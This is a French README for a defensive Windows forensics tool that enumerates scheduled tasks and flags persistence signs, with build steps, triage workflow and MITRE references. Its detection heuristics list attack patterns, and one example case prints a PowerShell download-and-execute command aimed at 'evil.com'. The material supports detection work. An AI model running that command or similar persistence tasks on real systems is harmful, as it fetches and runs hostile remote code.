# 🚀 Task Scheduler Forensics


**Version:** 3.0
**Partie de:** WinToolsSuite
**Objectif:** Analyse forensics des tâches planifiées Windows pour détecter persistence et comportements suspects

---

## 📋 Description

**Task Scheduler Forensics** est un outil d'investigation spécialisé dans l'analyse des tâches planifiées Windows (Task Scheduler). Les attaquants utilisent fréquemment les tâches planifiées pour établir une **persistence** sur les systèmes compromis, souvent en configurant des tâches cachées ou avec élévation de privilèges.

### Cas d'Usage Forensics

- Détection de backdoors via tâches cachées
- Identification de tâches avec élévation automatique (HighestAvailable)
- Analyse de scripts PowerShell encodés dans actions
- Timeline d'exécution de tâches suspectes
- Investigation post-intrusion sur workstations/serveurs

- --


# 🚀 Voir XML complet

# 🚀 Historique d'exécution

# 🚀 Désactiver temporairement

# 🚀 Supprimer (après documentation)

## ✨ Fonctionnalités Principales

### 1. Énumération Complète et Récursive

- **API Task Scheduler 2.0** (`ITaskService`)
- Parcours récursif de toute l'arborescence : `\`, `\Microsoft`, `\Custom`, etc.
- Extraction complète des définitions XML
- Support des tâches système et utilisateur

### 2. Parsing Détaillé des Composants

#### Triggers (Déclencheurs)
- BOOT : Démarrage système
- LOGON : Connexion utilisateur
- DAILY/WEEKLY/MONTHLY : Planification périodique
- EVENT : Événements système (EventLog-based)
- TIME : Date/heure spécifique

#### Actions
- **ExecAction** : Exécution programmes/scripts
- **ComHandler** : Invocation objets COM
- Extraction : Chemin + arguments complets

#### Principal (Contexte d'exécution)
- UserID : Compte d'exécution (SYSTEM, utilisateur)
- RunLevel : `LeastPrivilege` vs **`HighestAvailable`** (suspect!)

#### Settings
- **Hidden** : Tâche invisible dans GUI (indicateur fort de malveillance)
- Enabled/Disabled
- Conditions d'exécution

### 3. Détection de Comportements Suspects

L'outil applique des **heuristiques forensics** :

#### Indicateurs Techniques
- **Tâche cachée** (`Hidden=true`)
- **Élévation privilèges** (`RunLevel=HighestAvailable` ou `UserId=SYSTEM`)
- **PowerShell encodé** : `-EncodedCommand`, `base64`
- **Bypasses** : `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`
- **Download patterns** : `DownloadString`, `http://`, `ftp://`
- **Proxy execution** : `regsvr32`, `rundll32`, `mshta`, `wscript`
- **Commandes longues** : >400 caractères (obfuscation probable)

#### Triggers de Persistence
- LOGON + Hidden : Exécution au login utilisateur
- BOOT + SYSTEM : Démarrage automatique avec privilèges max

### 4. Interface Graphique Complète

#### ListView 8 Colonnes
- **Nom** : Nom de la tâche
- **Chemin** : Path complet dans arborescence
- **Trigger** : Type(s) de déclencheur
- **Action** : Commande/script (tronqué dans UI, complet en CSV)
- **Principal** : Utilisateur + RunLevel
- **Caché** : OUI/Non (Hidden flag)
- **Suspect** : OUI/Non (résultat heuristiques)
- **Notes** : Raisons de suspicion détaillées

#### Boutons
- **Énumérer Tâches** : Lance analyse complète (threading)
- **Désactiver (Admin)** : Affiche commande PowerShell
- **Exporter CSV** : Export UTF-8 avec BOM

- --


## Architecture Technique

### Technologies

- **Langage** : C++ moderne (C++17)
- **API principale** : `taskschd.lib` (Task Scheduler 2.0)
- **Vérification signatures** : `wintrust.lib` (WinVerifyTrust)
- **COM** : RAII pour `ITaskService`, `ITaskFolder`

### Gestion Mémoire

```cpp
class COMInitializer {
    // RAII pour CoInitialize/CoUninitialize
};

// Release automatique de toutes les interfaces COM
```

### Threading

- Énumération dans thread séparé (opérations lentes)
- UI responsive pendant parsing
- Barre status temps réel

- --


## Compilation

### Prérequis

- Windows SDK 10.0+
- Visual Studio 2019/2022 (MSVC)
- Support C++17

### Build Automatique

```batch
go.bat
```

### Build Manuelle

```batch
cl.exe /W4 /EHsc /O2 /std:c++17 /D_UNICODE /DUNICODE ^
    /Fe:TaskSchedulerForensics.exe TaskSchedulerForensics.cpp ^
    /link taskschd.lib comctl32.lib ole32.lib oleaut32.lib ^
          wintrust.lib crypt32.lib user32.lib gdi32.lib ^
          /SUBSYSTEM:WINDOWS
```

- --


## 🚀 Utilisation

### Lancement

```batch
TaskSchedulerForensics.exe
```

**Privilèges** : Utilisateur standard OK (lecture seule), admin pour modification

### Workflow d'Investigation

#### 1. Énumération
```
Cliquer "Énumérer Tâches"
→ Analyse complète arborescence Task Scheduler
→ Affichage dans ListView avec indicateurs suspects
```

#### 2. Triage des Menaces
Prioriser les tâches avec :
- **Suspect=OUI** ET **Caché=OUI** : Priorité maximale
- **Principal=SYSTEM + HighestAvailable** : Vérifier légitimité
- **Notes** contenant "powershell", "encodedcommand", "download"

#### 3. Investigation Approfondie
Pour une tâche suspecte :
```powershell
Get-ScheduledTask -TaskName "SuspiciousTask" | Select-Object -ExpandProperty TaskXml

Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational |
    Where-Object {$_.Message -like "*SuspiciousTask*"}
```

#### 4. Réponse à Incident
```powershell
Disable-ScheduledTask -TaskName "SuspiciousTask"

Unregister-ScheduledTask -TaskName "SuspiciousTask" -Confirm:$false
```

- --


## 💡 Exemples de Détection

### Cas 1 : Backdoor PowerShell Caché

```
Nom: WindowsUpdate
Chemin: \Microsoft\Windows\WindowsUpdate
Trigger: LOGON
Action: powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbw...
Principal: SYSTEM (HighestAvailable)
Caché: OUI
Suspect: OUI
Notes: Tâche cachée; Élévation privilèges; Pattern: powershell; Pattern: hidden; Pattern: encodedcommand
```

**Verdict** : Malware utilisant nom légitime pour camouflage.

### Cas 2 : Download & Execute

```
Nom: SystemMaintenance
Trigger: DAILY (12:00 AM)
Action: powershell.exe -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
Principal: CurrentUser (HighestAvailable)
Caché: Non
Suspect: OUI
Notes: Élévation privilèges; Pattern: powershell; Pattern: bypass; Pattern: http://; Commande très longue
```

**Verdict** : Persistence téléchargeant payload quotidiennement.

### Cas 3 : Tâche Légitime (Faux Positif)

```
Nom: GoogleUpdateTaskMachineCore
Chemin: \GoogleUpdate
Trigger: BOOT
Action: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /c
Principal: SYSTEM (HighestAvailable)
Caché: Non
Suspect: Non
Notes: (vide)
```

**Verdict** : Tâche légitime Google Update.

- --


## Export et Reporting

### Format CSV

```csv
Nom,Chemin,Trigger,Action,Principal,Caché,Suspect,Notes
"BackdoorTask","\Custom\BackdoorTask","LOGON","powershell.exe -EncodedCommand ...","SYSTEM (HighestAvailable)","OUI","OUI","Tâche cachée; Élévation privilèges; Pattern: powershell; Pattern: encodedcommand"
```

### Intégration Timeline

Pour corrélation avec autres artefacts :
1. Export CSV avec horodatage
2. Croiser avec :
   - Event Logs (TaskScheduler/Operational)
   - Prefetch (exécutions programmes)
   - Shimcache (première exécution)

- --


## Références MITRE ATT&CK

### Techniques Détectées

- **T1053.005** : Scheduled Task/Job - Scheduled Task
- **T1543** : Create or Modify System Process
- **T1078** : Valid Accounts (si usurpation compte système)

### Sub-Techniques

- Persistence via tâches au LOGON
- Élévation privilèges via RunLevel
- Execution proxy via PowerShell/scripts

- --


## Commandes PowerShell Complémentaires

### Liste Toutes les Tâches

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Filtrer Tâches Cachées

```powershell
Get-ScheduledTask | Where-Object {$_.Settings.Hidden -eq $true}
```

### Historique Exécutions

```powershell
Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational -MaxEvents 100 |
    Where-Object {$_.Id -eq 100 -or $_.Id -eq 102}
```

### Export XML Tâche

```powershell
Export-ScheduledTask -TaskName "SuspiciousTask" | Out-File task.xml
```

- --


## Limites et Considérations

### Limitations Techniques

- **Heuristiques** : Possibilité de faux positifs (outils admin légitimes)
- **Suppression** : Non implémentée (risque), utiliser PowerShell/GUI
- **Historique** : Pas d'accès direct aux logs d'exécution (utiliser Event Viewer)

### Faux Positifs Courants

- Tâches SCCM/MECM (Microsoft Endpoint Manager)
- Outils monitoring (Nagios, PRTG)
- Scripts IT internes avec élévation légitime

### Recommandations

- **Toujours vérifier contexte** : Nom, chemin, créateur
- **Baseline** : Établir inventaire tâches légitimes
- **Corrélation** : Croiser avec Event Logs et autres artefacts

- --


## 🔧 Troubleshooting

### Erreur "Connexion Task Scheduler échouée"

**Cause** : Service Task Scheduler arrêté

**Solution** :
```batch
sc query Schedule
net start Schedule
```

### Liste vide mais tâches existent

**Cause** : Droits insuffisants pour certaines tâches

**Solution** : Lancer en administrateur
```batch
runas /user:Administrator TaskSchedulerForensics.exe
```

- --


## 🔗 Ressources Complémentaires

### Documentation Microsoft

- [Task Scheduler API](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
- [Task Scheduler Events](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698)

### Outils Complémentaires

- **Autoruns** (Sysinternals) : Vue complète persistence
- **Task Scheduler GUI** : `taskschd.msc`
- **PowerShell** : `Get-ScheduledTask` cmdlet

- --


## 👤 Auteur et Licence

**Développé par** : WinToolsSuite Team
**Version** : 3.0
**Licence** : Usage libre pour analyse forensics et sécurité

- --


## Support

Pour bugs ou questions :
- Consulter documentation Task Scheduler Microsoft
- Vérifier Event Logs en cas d'anomalie

**Note** : Outil destiné à professionnels sécurité et forensics. Usage responsable requis.


- --

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>

- --

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>

- --

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>

---

<div align="center">

**⭐ Si ce projet vous plaît, n'oubliez pas de lui donner une étoile ! ⭐**

</div>